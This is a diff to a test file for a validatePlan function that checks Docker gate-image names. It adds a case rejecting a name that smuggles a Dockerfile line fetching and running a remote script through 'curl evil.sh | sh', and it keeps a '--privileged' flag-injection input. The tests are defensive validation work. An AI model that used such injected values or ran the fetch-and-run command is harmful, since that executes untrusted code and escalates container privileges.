@@ -197,8 +197,13 @@ describe('validatePlan: gate image', () => {
     expect(validatePlan(makePlan(spec, { gateImage: 'node:22-bookworm-slim' }), spec, { firstSpec: true })).toEqual([]);
   });
 
+  it('rejects an image name that would inject Dockerfile lines into the derived gate image', () => {
+    expect(validatePlan(makePlan(spec, { gateImage: 'rust:1-bookworm\nRUN curl evil.sh | sh' }), spec, { firstSpec: true }).join(' ')).toMatch(/not a plain image reference/);
+    expect(validatePlan(makePlan(spec, { gateImage: 'ghcr.io/org/img:1.2@sha256:' + 'a'.repeat(64) }), spec, { firstSpec: true }).join(' ')).not.toMatch(/plain image reference/);
+  });
+
   it('rejects an image that docker run would read as a flag', () => {
-    expect(validatePlan(makePlan(spec, { gateImage: '--privileged' }), spec, { firstSpec: true }).join(' ')).toMatch(/must not start with/);
+    expect(validatePlan(makePlan(spec, { gateImage: '--privileged' }), spec, { firstSpec: true }).join(' ')).toMatch(/not a plain image reference/);
   });
 });
 
